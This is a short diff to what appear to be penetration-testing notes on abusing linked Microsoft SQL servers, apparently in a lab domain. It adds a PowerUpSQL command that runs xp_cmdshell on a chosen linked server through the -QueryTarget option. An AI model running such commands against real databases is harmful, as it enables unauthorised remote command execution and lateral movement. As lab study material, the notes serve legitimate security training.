@@ -140,4 +140,10 @@ Abusing links to remote servers (tries to use `xp_cmdshell` on every link of the
 Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query 'exec master..xp_cmdshell ''whoami'''
 ```
 
+You can also use `-QueryTarget` to execute commands only on certain server:
+
+```
+Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -QueryTarget DB-SQLSRV -Query 'exec master..xp_cmdshell ''whoami''' 
+```
+
 ---
